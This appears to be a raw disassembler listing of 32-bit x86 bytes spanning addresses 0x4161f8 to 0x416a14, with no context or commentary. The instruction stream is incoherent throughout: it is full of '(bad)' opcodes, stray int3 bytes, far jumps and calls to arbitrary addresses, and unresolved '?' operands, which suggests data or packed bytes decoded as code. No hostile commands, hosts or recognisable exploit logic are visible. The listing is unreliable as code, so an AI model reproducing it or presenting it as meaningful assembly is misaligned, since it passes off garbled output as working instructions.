  4161f8:	icebp  
  4161f9:	add    DWORD PTR [eax],0xffffffcc
  4161fc:	mov    fs,edx
  4161fe:	mov    DWORD PTR [edx],esp
  416200:	dec    esp
  416201:	int3   
  416202:	add    BYTE PTR [eax],al
  416204:	icebp  
  416205:	jge    0x416207
  416207:	scas   al,BYTE PTR es:[edi]
  416208:	mov    cl,0x89
  41620a:	int3   
  41620b:	push   DWORD PTR [eax-0x23147c1d]
  416211:	(bad)  
  416212:	(bad)  
  416213:	(bad)  
  416214:	call   0x51a762fe
  416219:	inc    DWORD PTR [eax]
  41621b:	jmp    FWORD PTR [edi-0x4d69ff12]
  416221:	add    BYTE PTR [eax],al
  416223:	add    BYTE PTR [ebp-0x2e8c7c07],ch
  416229:	cmp    edi,0xffffffff
  41622c:	cmp    DWORD PTR [ebx-0x1],ecx
  41622f:	imul   ecx,esi,0x62ff0000
  416235:	ins    BYTE PTR es:[edi],dx
  416236:	(bad)  
  416237:	cli    
  416238:	push   cs
  416239:	mov    DWORD PTR [ecx-0x7cf6877d],ecx
  41623f:	call   0xd3ec:0xffccff63
  416246:	(bad)  
  416247:	mov    esi,0xff89a9
  41624c:	pusha  
  41624d:	pop    ds
  41624e:	cmp    DWORD PTR [edx+0x61],0xffffffff
  416252:	add    DWORD PTR [eax],0xfffffff9
  416255:	push   edx
  416256:	add    BYTE PTR [edx-0x65],cl
  416259:	add    bh,bh
  41625b:	push   edi
  41625d:	mov    bh,bh
  41625f:	mov    es,ebx
  416261:	(bad)  
  416262:	inc    DWORD PTR [eax]
  416264:	lods   al,BYTE PTR ds:[esi]
  416265:	adc    ecx,esp
  416267:	lahf   
  416268:	xchg   ebp,eax
  416269:	dec    DWORD PTR [ecx-0x3381d600]
  41626f:	ja     0x41620b
  416271:	(bad)  
  416272:	(bad)  
  416273:	call   ecx
  416275:	test   BYTE PTR [eax],al
  416277:	pop    ebx
  416278:	cmp    bh,0x83
  41627b:	jmp    esi
  41627d:	ja     0x41627e
  41627f:	xchg   ebp,eax
  416280:	int3   
  416281:	add    BYTE PTR [ecx-0xc57800],cl
  416287:	mov    esi,0xff830005
  41628c:	cwde   
  41628d:	test   al,0x0
  41628f:	mov    ebx,0x83ff89b3
  416294:	jle    0x4162de
  416296:	inc    DWORD PTR [esi]
  416298:	sub    BYTE PTR [eax],al
  41629a:	int3   
  41629b:	add    BYTE PTR [edi],bl
  41629d:	xchg   ebx,eax
  41629e:	inc    DWORD PTR [ebp+ebx*8-0x1]
  4162a2:	(bad)  
  4162a3:	dec    DWORD PTR [edx+0xb]
  4162a6:	(bad)  
  4162a7:	jle    0x416324
  4162a9:	inc    DWORD PTR [eax]
  4162ab:	int3   
  4162ac:	jg     0x416232
  4162ae:	(bad)  
  4162af:	jmp    0xffc5622a
  4162b4:	sbb    BYTE PTR fs:[ecx-0x76006dfd],cl
  4162bb:	inc    DWORD PTR ds:0xf51f83c6
  4162c1:	add    bh,bh
  4162c3:	add    BYTE PTR [ebp+0x1e],ah
  4162c6:	adc    DWORD PTR [ebx-0x330033ba],0x5b
  4162cd:	(bad)  
  4162ce:	push   DWORD PTR [ebx-0x764b]
  4162d4:	adc    DWORD PTR [edx-0x76fdad00],eax
  4162da:	inc    DWORD PTR [eax]
  4162dc:	cmp    edi,0xffffffff
  4162df:	cwde   
  4162e0:	xor    bh,bh
  4162e2:	int3   
  4162e3:	mov    DWORD PTR [edx-0x3f],edi
  4162e6:	jmp    DWORD PTR [edx+0xff839d]
  4162ec:	bnd jo 0x4162ee
  4162ef:	inc    edi
  4162f0:	mov    al,0xcc
  4162f2:	int3   
  4162f3:	jmp    ebx
  4162f5:	ins    BYTE PTR es:[edi],dx
  4162f6:	cmp    DWORD PTR [edi],0x68
  4162f9:	inc    DWORD PTR [eax]
  4162fb:	add    BYTE PTR [ebx],al
  4162fd:	inc    esi
  4162fe:	mov    esp,ebp
  416300:	adc    bh,bh
  416302:	add    BYTE PTR [ebx+0x1383a11a],al
  416308:	inc    eax
  416309:	cmp    edi,0x0
  41630c:	mov    cl,0xa3
  41630e:	jmp    FWORD PTR [edi]
  416310:	rol    BYTE PTR [eax],1
  416312:	dec    esp
  416314:	pop    ecx
  416315:	push   edi
  416316:	call   FWORD PTR [ecx+0x23]
  416319:	(bad)  
  41631a:	(bad)  
  41631b:	inc    DWORD PTR [ebp+0x6b]
  41631e:	add    DWORD PTR [ecx],0x5f
  416321:	add    bh,bh
  416323:	call   FWORD PTR ds:0x509cce5
  416329:	int3   
  41632a:	add    bh,bh
  41632c:	or     DWORD PTR [eax+0x0],0xffffffa2
  416330:	xor    eax,0xd60000ff
  416335:	push   edi
  416336:	and    ebx,0xffffffe5
  416339:	inc    DWORD PTR [eax]
  41633b:	add    DWORD PTR [ecx],0xffffffd3
  41633e:	dec    DWORD PTR [ecx-0x7cff7cfb]
  416344:	and    DWORD PTR [ebx+0xdd40ff],esi
  41634a:	inc    DWORD PTR [eax]
  41634c:	gs jle 0x41634e
  41634f:	scas   al,BYTE PTR es:[edi]
  416350:	pushf  
  416351:	inc    DWORD PTR [ebx-0xbb801]
  416357:	rol    BYTE PTR [edx],1
  416359:	add    BYTE PTR [ebx-0x7c74b800],al
  41635f:	arpl   bp,di
  416361:	inc    DWORD PTR [ebx-0x331bb700]
  416367:	pop    esi
  416368:	(bad)  
  416369:	dec    esp
  41636b:	call   ecx
  41636d:	inc    ebx
  41636e:	add    BYTE PTR [edx-0x7c0076f2],al
  416374:	lahf   
  416375:	inc    edi
  416376:	int3   
  416377:	push   es
  416378:	nop
  416379:	add    DWORD PTR [eax],0xffffffcc
  41637c:	cli    
  41637d:	repnz inc ebp
  416380:	xor    eax,DWORD PTR [eax]
  416382:	mov    DWORD PTR [ecx+0x1589e60b],ecx
  416388:	cs dec esp
  41638b:	sub    DWORD PTR [esi+0x71c2ff25],0x0
  416392:	add    bh,bh
  416394:	push   es
  416395:	test   bh,bh
  416397:	rol    DWORD PTR [bp+di-0x1],0x21
  41639d:	mov    eax,ds:0x64b283
  4163a2:	inc    DWORD PTR [ebx+0x74ff325f]
  4163a8:	stos   BYTE PTR es:[edi],al
  4163a9:	dec    esp
  4163ab:	push   DWORD PTR [edi]
  4163ad:	test   eax,0x279dff
  4163b2:	(bad)  
  4163b3:	push   DWORD PTR [edx]
  4163b5:	inc    edi
  4163b6:	call   eax
  4163b8:	loopne 0x4163ba
  4163ba:	add    BYTE PTR [ecx-0x6300e2f0],cl
  4163c0:	call   0xb5c562c5
  4163c5:	cmp    edi,edi
  4163c7:	movnti DWORD PTR [eax],eax
  4163ca:	inc    DWORD PTR [eax]
  4163cc:	sbb    DWORD PTR [ecx-0x6fb501],0xffffffff
  4163d3:	(bad)  
  4163d4:	mov    edx,0xd0ceff40
  4163d9:	(bad)  
  4163da:	(bad)  
  4163db:	inc    DWORD PTR [ecx-0x1f]
  4163de:	jmp    FWORD PTR [ebx]
  4163e0:	add    edi,edi
  4163e2:	inc    DWORD PTR [ebx-0x43331c9a]
  4163e8:	arpl   di,di
  4163ea:	add    bh,bh
  4163ec:	lods   al,BYTE PTR ds:[si]
  4163ee:	jmp    ebx
  4163f0:	or     edi,edi
  4163f2:	inc    DWORD PTR [ebx-0xf0004dc]
  4163f8:	hlt    
  4163f9:	(bad)  
  4163fa:	(bad)  
  4163fb:	jmp    DWORD PTR [edi+0x47af00e4]
  416401:	add    bh,bh
  416403:	(bad)  
  416404:	(bad)  
  416405:	stc    
  416406:	add    BYTE PTR [ebx-0x40],cl
  416409:	add    DWORD PTR [eax],0x0
  41640c:	ret    
  41640d:	pop    eax
  41640e:	mov    DWORD PTR [ecx],ecx
  416410:	xor    ecx,DWORD PTR [ecx-0x393f0001]
  416416:	inc    DWORD PTR [eax]
  416418:	(bad)  
  416419:	(bad)  
  41641a:	inc    DWORD PTR [ebx+0x23ff0ce0]
  416420:	sub    edi,edi
  416422:	add    BYTE PTR [eax],al
  416424:	xchg   ebp,eax
  416425:	dec    ecx
  416426:	call   DWORD PTR [edx-0x26]
  416429:	cmp    edi,0x0
  41642c:	mov    al,0x37
  41642e:	jmp    FWORD PTR [ecx+0x48]
  416431:	inc    DWORD PTR [eax]
  416433:	(bad)  
  416434:	jl     0x416434
  416436:	jmp    FWORD PTR [edx+0x21]
  416439:	add    bh,bh
  41643b:	(bad)  
  41643c:	jle    0x4164b0
  41643e:	(bad)  
  41643f:	jg     0x416496
  416441:	add    bh,bh
  416443:	push   esi
  416445:	cmp    bh,bh
  416447:	add    dl,BYTE PTR [ebp-0x34]
  41644a:	(bad)  
  41644b:	(bad)  
  41644c:	dec    DWORD PTR [esi]
  41644e:	and    DWORD PTR [ebp+0x3c],0xffffffff
  416452:	add    bh,bh
  416454:	dec    ebp
  416455:	sub    edi,edi
  416457:	fcomp  QWORD PTR [eax-0x1]
  41645a:	cmp    edi,0xffffffb1
  41645d:	pusha  
  41645e:	call   FWORD PTR [ebx-0x7c000094]
  416464:	clc    
  416465:	cld    
  416466:	int3   
  416467:	jl     0x4164d1
  416469:	inc    DWORD PTR [ebx-0x76f4d101]
  41646f:	aad    0x5
  416471:	(bad)  
  416472:	inc    DWORD PTR [eax]
  416474:	je     0x4164ae
  416476:	(bad)  
  416477:	jmp    0xa5cb:0xffffffb9
  41647e:	call   FWORD PTR [edi+ebp*1+0x0]
  416482:	add    bh,bh
  416484:	cmp    DWORD PTR [ecx+0x0],eax
  416487:	ds loope 0x416489
  41648a:	add    BYTE PTR [ecx+0x540004fe],cl
  416490:	mov    eax,0xa983ff83
  416495:	stos   DWORD PTR es:[edi],eax
  416496:	jmp    DWORD PTR [ecx-0x68]
  416499:	(bad)  
  41649a:	dec    esp
  41649c:	mov    edi,0x7e1b8985
  4164a1:	cmp    edi,0xffffffcc
  4164a4:	repnz mov ecx,0xff60f183
  4164aa:	inc    DWORD PTR [eax]
  4164ac:	inc    ebp
  4164ad:	notrack call DWORD PTR [edi-0x3d]
  4164b1:	inc    DWORD PTR [eax]
  4164b3:	int3   
  4164b4:	mov    ?,edx
  4164b6:	add    BYTE PTR [ebp+edi*8-0x34],dh
  4164ba:	cmp    edi,0xffffffe5
  4164bd:	cmp    eax,0xf27dff
  4164c2:	inc    DWORD PTR [eax]
  4164c4:	sub    eax,0xd9008338
  4164c9:	(bad)  
  4164ca:	(bad)  
  4164cb:	jmp    FWORD PTR [esi+0x3c]
  4164ce:	int3   
  4164cf:	push   esi
  4164d0:	lea    eax,[eax]
  4164d2:	(bad)  
  4164d3:	inc    DWORD PTR [esi+0x36]
  4164d6:	add    BYTE PTR [edi+0xffccdd],al
  4164dc:	xor    ebx,eax
  4164de:	add    DWORD PTR [edx-0xff46],0xfffffffc
  4164e5:	fiadd  WORD PTR [eax]
  4164e7:	add    al,0xa
  4164e9:	inc    DWORD PTR [eax]
  4164eb:	adc    DWORD PTR [ecx+0x1f90ffc3],0xffffffff
  4164f2:	(bad)  
  4164f3:	jmp    FWORD PTR [eax+0x62f40065]
  4164f9:	add    bh,bh
  4164fb:	add    BYTE PTR [edi-0x80],ch
  4164fe:	call   esi
  416500:	add    eax,0x55ff89ff
  416505:	fs add cl,bh
  416508:	pushf  
  416509:	cmp    edi,0xffffffff
  41650c:	xchg   ecx,eax
  41650d:	pushf  
  41650e:	add    DWORD PTR [edi+ecx*1-0x61003301],0x19
  416516:	add    BYTE PTR [edx+0x8],dh
  416519:	add    BYTE PTR [ebx-0x56f37d],al
  41651f:	cmp    BYTE PTR [esi],dh
  416521:	int3   
  416522:	add    bh,bh
  416524:	adc    al,0x17
  416526:	add    BYTE PTR [edx],al
  416528:	cld    
  416529:	int3   
  41652a:	cmp    edi,0xf
  41652d:	popa   
  41652e:	inc    DWORD PTR [eax+0x83005c]
  416534:	jp     0x41650e
  416536:	inc    DWORD PTR [esi]
  416538:	xchg   edx,eax
  416539:	(bad)  
  41653a:	(bad)  
  41653b:	jmp    FWORD PTR [edi+0x2f9a83f6]
  416541:	cmp    edi,0xffffffff
  416544:	(bad)  
  416546:	mov    DWORD PTR [esi+0x52],ebx
  416549:	inc    DWORD PTR [eax]
  41654b:	or     esp,0xffffff98
  41654e:	add    bl,bl
  416550:	(bad)  
  416551:	inc    DWORD PTR [eax]
  416553:	dec    DWORD PTR [eax+0x4916ff07]
  416559:	(bad)  
  41655a:	inc    DWORD PTR [ebx-0x4c7c3ca9]
  416560:	sar    bh,cl
  416562:	add    BYTE PTR [ebx-0x367c44ac],al
  416568:	jnp    0x41656a
  41656a:	(bad)  
  41656b:	jmp    DWORD PTR [edx-0x19]
  41656e:	jmp    FWORD PTR [edi+0xff0c]
  416574:	jbe    0x4165a8
  416576:	int3   
  416577:	or     BYTE PTR [edi-0x77],0x0
  41657b:	jmp    DWORD PTR [eax+0x1f70ff7a]
  416581:	(bad)  
  416582:	inc    DWORD PTR [ebx-0x3002e1f]
  416588:	inc    edx
  416589:	add    bh,bh
  41658b:	mov    DWORD PTR [ecx+ebx*2-0x1],edi
  41658f:	ins    DWORD PTR es:[edi],dx
  416590:	in     eax,0xff
  416592:	(bad)  
  416593:	jmp    FWORD PTR [esi-0x7b87ffbd]
  416599:	inc    DWORD PTR [eax]
  41659b:	(bad)  
  41659c:	clc    
  41659d:	cwde   
  41659e:	dec    DWORD PTR [ebx]
  4165a0:	or     eax,0x4f83ccff
  4165a5:	xor    eax,0xccff1d83
  4165aa:	mov    DWORD PTR [eax],eax
  4165ac:	cld    
  4165ad:	js     0x4165ae
  4165af:	add    al,0x80
  4165b1:	mov    DWORD PTR [ecx-0xa0ff00],ecx
  4165b7:	inc    ebp
  4165b8:	aad    0xff
  4165ba:	(bad)  
  4165bb:	dec    DWORD PTR [edx]
  4165bd:	inc    ebp
  4165be:	jmp    FWORD PTR [eax+0x34]
  4165c1:	add    BYTE PTR [ecx-0x7613f401],cl
  4165c7:	in     al,dx
  4165c8:	fadd   QWORD PTR [eax]
  4165ca:	inc    DWORD PTR [ebx+0x4800b7d0]
  4165d0:	imul   edi,edi,0xc66e00cc
  4165d6:	add    BYTE PTR [edx+ebx*8+0x2ff00ff],bl
  4165dd:	aad    0xff
  4165df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e0:	jge    0x4165e1
  4165e2:	(bad)  
  4165e3:	jmp    FWORD PTR [eax-0x41d9337c]
  4165e9:	inc    DWORD PTR [ebx+0x23aaff]
  4165ef:	daa    
  4165f0:	fdiv   st(7),st
  4165f2:	add    bh,bh
  4165f4:	mov    DWORD PTR [edi+0x0],edi
  4165f7:	pop    ebx
  4165f8:	mov    esi,0x9a83ffff
  4165fd:	cmp    bh,bh
  4165ff:	cmc    
  416600:	pop    esp
  416601:	or     esp,0x0
  416604:	pop    ds
  416605:	cmp    edi,0xffffff87
  416608:	inc    BYTE PTR [ebx-0x23bb7d00]
  41660e:	jmp    esp
  416610:	and    bh,bh
  416612:	(bad)  
  416613:	push   DWORD PTR [ebp+0x26faff09]
  416619:	add    bh,bh
  41661b:	add    bl,cl
  41661d:	add    cl,BYTE PTR [ecx-0x33ffc494]
  416623:	call   DWORD PTR [ebx+0x1b896e]
  416629:	(bad)  
  41662a:	(bad)  
  41662b:	jmp    eax
  41662d:	aas    
  41662e:	add    BYTE PTR [esi-0x2a],cl
  416631:	(bad)  
  416632:	(bad)  
  416633:	call   DWORD PTR [esp+edx*1-0x1]
  416637:	daa    
  416638:	xchg   edx,eax
  416639:	add    bh,bh
  41663b:	sbb    DWORD PTR [eax],0x36
  41663e:	call   DWORD PTR [ebp-0x7c32]
  416644:	adc    DWORD PTR [eax],esp
  416646:	add    bl,ch
  416648:	(bad)  
  416649:	inc    DWORD PTR [eax]
  41664b:	call   ebp
  41664d:	jbe    0x4165d2
  41664f:	sbb    bl,BYTE PTR [edx-0x1]
  416652:	int3   
  416653:	add    dh,dl
  416655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416656:	call   esp
  416658:	pop    esi
  416659:	inc    DWORD PTR [eax]
  41665b:	add    BYTE PTR [edx],ch
  41665d:	sub    al,0xcc
  41665f:	bound  edi,QWORD PTR [ecx+0x0]
  416662:	add    BYTE PTR [ecx-0x24ff135b],cl
  416668:	inc    eax
  416669:	add    bh,bh
  41666b:	add    cl,ch
  41666d:	sub    esp,ecx
  41666f:	bound  edi,QWORD PTR [edx]
  416671:	add    bh,bh
  416673:	(bad)  
  416674:	cmp    edi,DWORD PTR [esi]
  416676:	mov    DWORD PTR [ecx-0x43],esi
  416679:	(bad)  
  41667a:	(bad)  
  41667b:	inc    DWORD PTR [ebx-0x1a997c8e]
  416681:	add    bh,bh
  416683:	dec    esp
  416685:	pusha  
  416686:	add    BYTE PTR [ecx+0x4b],cl
  416689:	(bad)  
  41668a:	inc    DWORD PTR [ebx-0x5733123a]
  416690:	ret    0xff
  416693:	mov    DWORD PTR [ebp+0x5e90ffc9],eax
  416699:	(bad)  
  41669a:	inc    DWORD PTR [ebx+0x3400d1b1]
  4166a0:	(bad)  
  4166a2:	(bad)  
  4166a3:	call   DWORD PTR [edi]
  4166a5:	jne    0x4166a7
  4166a7:	test   eax,0x83890023
  4166ac:	mov    ecx,DWORD PTR [ebp-0x7d]
  4166af:	xor    BYTE PTR [ecx+0x0],ch
  4166b2:	inc    DWORD PTR [eax]
  4166b4:	stos   BYTE PTR es:[edi],al
  4166b5:	push   es
  4166b6:	add    BYTE PTR [eax],al
  4166b8:	loopne 0x4166b9
  4166ba:	cmp    edi,0x29
  4166bd:	cmp    eax,0xff9a0e00
  4166c2:	(bad)  
  4166c3:	call   DWORD PTR [ebp+0x6d3400b2]
  4166c9:	inc    DWORD PTR [ebx+0x3db3cc]
  4166cf:	fld    QWORD PTR ds:[eax]
  4166d2:	cmp    edi,0xfffffffa
  4166d5:	loope  0x4166d6
  4166d7:	mov    WORD PTR [ecx+0x6689ff00],fs
  4166dd:	add    bh,bh
  4166df:	ds adc eax,0x41ff00cc
  4166e5:	mov    edi,0xcc759300
  4166ea:	add    BYTE PTR [ebx-0x50ffe82e],al
  4166f0:	adc    bh,bh
  4166f2:	inc    DWORD PTR [eax]
  4166f4:	popa   
  4166f5:	inc    edx
  4166f6:	dec    DWORD PTR [ebx+0x89e4]
  4166fc:	jmp    0xede8673d
  416701:	(bad)  
  416702:	dec    esp
  416704:	mov    ch,0x89
  416706:	call   FWORD PTR [edx+0x45]
  416709:	add    bh,bh
  41670b:	add    cl,ah
  41670d:	int3   
  41670e:	int3   
  41670f:	out    dx,eax
  416710:	xchg   ebp,eax
  416711:	add    BYTE PTR [eax],al
  416713:	jmp    DWORD PTR [edx]
  416715:	pop    ebx
  416716:	adc    DWORD PTR [esi],0xffffffcc
  416719:	inc    DWORD PTR [ebx-0x52c001]
  41671f:	pop    esp
  416720:	out    dx,al
  416721:	mov    edi,edi
  416723:	(bad)  
  416724:	ds clc 
  416726:	inc    DWORD PTR [esi-0x767c6a]
  41672c:	pushf  
  41672d:	push   cs
  41672e:	inc    DWORD PTR [esi]
  416730:	mov    eax,0xfa00ff00
  416735:	and    edi,edi
  416737:	or     al,0xdb
  416739:	add    bh,bh
  41673b:	add    BYTE PTR [esi-0x25],cl
  41673e:	add    DWORD PTR [edx+0xe],0xffffffff
  416742:	int3   
  416743:	add    BYTE PTR [edi],cl
  416745:	xchg   edx,eax
  416746:	push   DWORD PTR [ecx+eax*1+0x5100ffff]
  41674d:	fdivr  st,st(7)
  41674f:	and    DWORD PTR [eax+0x6c83ff00],0xffffff9e
  416756:	push   DWORD PTR [esi-0x11]
  416759:	add    BYTE PTR [eax],al
  41675b:	int3   
  41675c:	jg     0x4167ae
  41675e:	call   DWORD PTR [ebx-0x3341]
  416764:	aam    0x88
  416766:	call   FWORD PTR [esp+edx*2-0x1]
  41676a:	add    DWORD PTR [eax],0xffffffc3
  41676d:	xor    edi,edi
  41676f:	lods   al,BYTE PTR ds:[esi]
  416770:	fmulp  st(4),st
  416772:	dec    esp
  416774:	stos   DWORD PTR es:[edi],eax
  416775:	bound  eax,QWORD PTR [ebx-0x7c7c920f]
  41677b:	push   esi
  41677d:	mov    ebx,0xffc761ff
  416782:	(bad)  
  416783:	jmp    DWORD PTR [edi-0x137433a6]
  416789:	cmp    edi,0xffffffcc
  41678c:	xor    BYTE PTR [eax-0x33950201],dh
  416792:	dec    esp
  416794:	std    
  416795:	and    al,BYTE PTR [eax]
  416797:	rcr    bh,cl
  416799:	dec    esp
  41679b:	call   DWORD PTR [esi]
  41679d:	es jmp ebp
  4167a0:	je     0x4167a1
  4167a2:	add    DWORD PTR [eax],0xffffffc8
  4167a5:	cmp    al,BYTE PTR [eax]
  4167a7:	lods   eax,DWORD PTR ds:[esi]
  4167a8:	push   cs
  4167a9:	inc    DWORD PTR [eax]
  4167ab:	jmp    FWORD PTR [edx-0x6f9e0008]
  4167b1:	add    ah,cl
  4167b3:	push   ebx
  4167b5:	outs   dx,BYTE PTR ds:[esi]
  4167b6:	jmp    FWORD PTR [edi-0x7600ff]
  4167bc:	cmc    
  4167bd:	push   edi
  4167be:	add    BYTE PTR [edx-0x7c33e6],ah
  4167c4:	repnz (bad) 
  4167c6:	push   DWORD PTR [edx]
  4167c8:	loopne 0x4167ca
  4167ca:	(bad)  
  4167cb:	call   ecx
  4167cd:	fwait
  4167ce:	and    DWORD PTR [edx-0x5b],0x31
  4167d5:	pushf  
  4167d6:	add    BYTE PTR [ebx-0x6c],dh
  4167d9:	(bad)  
  4167da:	(bad)  
  4167db:	(bad)  
  4167dc:	jmp    0x974f6855
  4167e1:	cmp    edi,0x0
  4167e4:	sbb    eax,0xd6b200b8
  4167e9:	int3   
  4167ea:	cmp    edi,0xffffff94
  4167ed:	adc    DWORD PTR [eax],eax
  4167ef:	ins    DWORD PTR es:[edi],dx
  4167f0:	adc    bh,bh
  4167f2:	mov    edi,edi
  4167f4:	pop    ss
  4167f5:	in     eax,0xcc
  4167f7:	push   esi
  4167f8:	pop    ss
  4167f9:	(bad)  
  4167fa:	inc    DWORD PTR [eax]
  4167fc:	scas   al,BYTE PTR es:[edi]
  4167fd:	sti    
  4167fe:	call   FWORD PTR [ebx-0x19]
  416801:	add    DWORD PTR [eax],0x0
  416804:	and    BYTE PTR [esi],al
  416806:	push   DWORD PTR [eax+0x27]
  416809:	inc    DWORD PTR [eax]
  41680b:	or     DWORD PTR [edx],0x5e
  41680e:	or     DWORD PTR [ebx+0x6e],0xffffffff
  416812:	inc    DWORD PTR [eax]
  416814:	jne    0x4167ec
  416816:	add    BYTE PTR [eax-0x7c00ff2b],ah
  41681c:	cmp    bl,BYTE PTR [ebx-0x7d]
  41681f:	pop    esp
  416820:	mov    al,0x0
  416822:	inc    DWORD PTR [ebx-0x4000989d]
  416828:	test   eax,0x3683ffcc
  41682d:	cmc    
  41682e:	jmp    FWORD PTR [eax-0x763328]
  416834:	mul    DWORD PTR [ebx+0x0]
  416837:	call   0xff4267e0
  41683c:	inc    eax
  41683d:	push   0x42ff83
  416842:	add    BYTE PTR [eax],al
  416844:	xlat   BYTE PTR ds:[ebx]
  416845:	repz add bh,cl
  416848:	int3   
  416849:	inc    DWORD PTR [eax]
  41684b:	inc    DWORD PTR [eax-0x12]
  41684e:	int3   
  41684f:	enter  0xff03,0xcc
  416853:	add    BYTE PTR [ecx+0xc8cffe8],cl
  416859:	(bad)  
  41685a:	(bad)  
  41685b:	(bad)  
  41685c:	mov    edi,0xa85a8354
  416861:	(bad)  
  416862:	(bad)  
  416863:	jmp    FWORD PTR [edx]
  416865:	cdq    
  416866:	add    BYTE PTR [edi],bl
  416868:	loopne 0x416869
  41686a:	inc    DWORD PTR [eax]
  41686c:	mov    al,0x85
  41686e:	int3   
  41686f:	aad    0x1b
  416871:	(bad)  
  416872:	(bad)  
  416873:	jmp    FWORD PTR [edx]
  416875:	sti    
  416876:	int3   
  416877:	leave  
  416878:	xor    eax,0x16ffccff
  41687d:	pop    esi
  41687e:	mov    esi,esp
  416880:	call   0x8349:0x8cffcc83
  416887:	stos   BYTE PTR es:[edi],al
  416888:	loopne 0x41680d
  41688a:	(bad)  
  41688b:	(bad)  
  41688c:	mov    ecx,0xc91bff54
  416891:	inc    DWORD PTR [eax]
  416893:	add    BYTE PTR [ecx],ch
  416895:	(bad)  
  416897:	sti    
  416898:	mov    ds:0x59ffffff,eax
  41689d:	dec    ecx
  41689e:	add    BYTE PTR [edi-0x90],bl
  4168a4:	bswap  ebp
  4168a6:	push   DWORD PTR [edi]
  4168a8:	in     eax,dx
  4168a9:	add    BYTE PTR [ebx+0x9919ff],al
  4168af:	push   ds
  4168b0:	push   esi
  4168b1:	add    bh,bh
  4168b3:	cmp    DWORD PTR [edx+edx*2-0xb88701],0xffffff83
  4168bb:	push   DWORD PTR [ebp+0x2f388317]
  4168c1:	mov    DWORD PTR [ecx-0xb7aa34],ecx
  4168c7:	cmc    
  4168c8:	or     ah,cl
  4168ca:	int3   
  4168cb:	int3   
  4168cc:	js     0x4168e9
  4168ce:	inc    ebp
  4168d0:	pop    edx
  4168d1:	inc    DWORD PTR [eax]
  4168d3:	int3   
  4168d4:	sub    DWORD PTR [ecx+0xf676cc],ecx
  4168da:	inc    DWORD PTR [eax]
  4168dc:	inc    edx
  4168dd:	(bad)  
  4168df:	dec    ebx
  4168e0:	and    BYTE PTR [ebx+0x4bcf00ff],al
  4168e6:	or     DWORD PTR [edx],0x62
  4168e9:	(bad)  
  4168ea:	(bad)  
  4168eb:	inc    edi
  4168ed:	and    BYTE PTR [eax],al
  4168ef:	adc    ah,BYTE PTR [esi-0x34]
  4168f2:	inc    DWORD PTR [eax]
  4168f4:	push   0xffffffd0
  4168f6:	add    ah,al
  4168f8:	aaa    
  4168f9:	add    BYTE PTR [eax],al
  4168fb:	int3   
  4168fc:	push   es
  4168fd:	dec    edi
  4168fe:	and    DWORD PTR [ebx-0x44],0x0
  416902:	add    bh,bh
  416904:	push   es
  416905:	push   eax
  416906:	(bad)  
  416907:	jge    0x416974
  416909:	mov    edi,edi
  41690b:	call   FWORD PTR [esi+ebp*1-0x33a5d834]
  416912:	add    ah,cl
  416914:	retf   
  416915:	mov    edi,?
  416917:	mov    WORD PTR [eax],?
  416919:	add    bh,bh
  41691b:	add    cl,bl
  41691d:	push   ebp
  41691e:	dec    esi
  416920:	jne    0x416922
  416922:	add    bh,bh
  416924:	popf   
  416925:	or     DWORD PTR [eax],eax
  416927:	xor    al,0x82
  416929:	(bad)  
  41692a:	(bad)  
  41692b:	(bad)  
  41692c:	cmp    eax,0xa906ff74
  416931:	mov    edi,edi
  416933:	add    DWORD PTR [edi-0x74c033b1],0xffffff83
  41693a:	add    BYTE PTR [ebx-0x437ca34d],al
  416940:	xchg   edx,eax
  416941:	add    BYTE PTR [ebx-0x7ecc34],al
  416947:	xlat   BYTE PTR ds:[ebx]
  416948:	push   esp
  416949:	dec    esp
  41694b:	add    BYTE PTR [edx-0x4367ff5f],ah
  416951:	(bad)  
  416952:	(bad)  
  416953:	jmp    ecx
  416955:	and    al,BYTE PTR [ebx-0x7cffd7e6]
  41695b:	int3   
  41695c:	fs dec ebx
  41695e:	jmp    FWORD PTR [ecx+edx*1-0x1bff0001]
  416965:	or     bh,bh
  416967:	mov    ds:0x8383cc5c,eax
  41696c:	das    
  41696d:	idiv   bh
  41696f:	das    
  416970:	sbb    al,0xff
  416972:	dec    DWORD PTR [ecx+0xbffa290]
  416978:	ja     0x41697a
  41697a:	add    DWORD PTR [eax],0x2c
  41697d:	fadd   QWORD PTR [eax]
  41697f:	xor    esp,DWORD PTR ds:0xc3ffffff
  416985:	xchg   esi,eax
  416986:	call   FWORD PTR [ebp+0x48]
  416989:	(bad)  
  41698a:	(bad)  
  41698b:	push   edx
  41698d:	push   cs
  41698e:	(bad)  
  41698f:	mov    ebp,0x83ffff89
  416994:	xchg   ecx,eax
  416995:	push   ss
  416996:	add    BYTE PTR [ebx+0x27],cl
  416999:	add    ah,cl
  41699b:	add    BYTE PTR [edx],dl
  41699d:	push   eax
  41699e:	add    BYTE PTR [eax-0xffde],ah
  4169a4:	lds    ebx,FWORD PTR [edi-0x1]
  4169a7:	repz cdq 
  4169a9:	add    bh,bh
  4169ab:	push   DWORD PTR [ecx+0xe]
  4169ae:	cmp    DWORD PTR ds:0xff0000c5,0x6b
  4169b5:	or     eax,0x89c844ff
  4169ba:	add    DWORD PTR [eax],0x38
  4169bd:	sbb    DWORD PTR cs:[ebx],0x49
  4169c1:	dec    esp
  4169c3:	call   FWORD PTR [ebx+0x1a]
  4169c6:	dec    DWORD PTR [edx]
  4169c8:	inc    esp
  4169c9:	add    BYTE PTR [eax],al
  4169cb:	add    BYTE PTR [edx],dh
  4169cd:	leave  
  4169ce:	add    BYTE PTR [ebp+0x64],ch
  4169d1:	cmp    edi,0x0
  4169d4:	adc    dl,BYTE PTR [ecx+0x0]
  4169d7:	mov    ds:0xffccff46,eax
  4169dc:	ror    DWORD PTR [ebx-0x608400],1
  4169e2:	(bad)  
  4169e3:	dec    edx
  4169e5:	test   al,0x0
  4169e7:	lahf   
  4169e8:	cmp    bh,0x89
  4169eb:	add    BYTE PTR [edi+0x4ca0ffdd],bl
  4169f1:	cmp    edi,0xffffffff
  4169f4:	mov    dh,0xa0
  4169f6:	add    BYTE PTR [edx+0x78],dl
  4169f9:	(bad)  
  4169fa:	inc    DWORD PTR [eax]
  4169fc:	or     esi,DWORD PTR [ebp-0x52d400]
  416a02:	mov    DWORD PTR [eax],eax
  416a04:	xchg   ebx,eax
  416a05:	sti    
  416a06:	sbb    DWORD PTR [eax-0x45],0xffffffcc
  416a0a:	add    DWORD PTR [ebx+0xdff986f],0xa
  416a11:	(bad)  
  416a12:	inc    DWORD PTR [eax]
  416a14:	rcl    al,cl
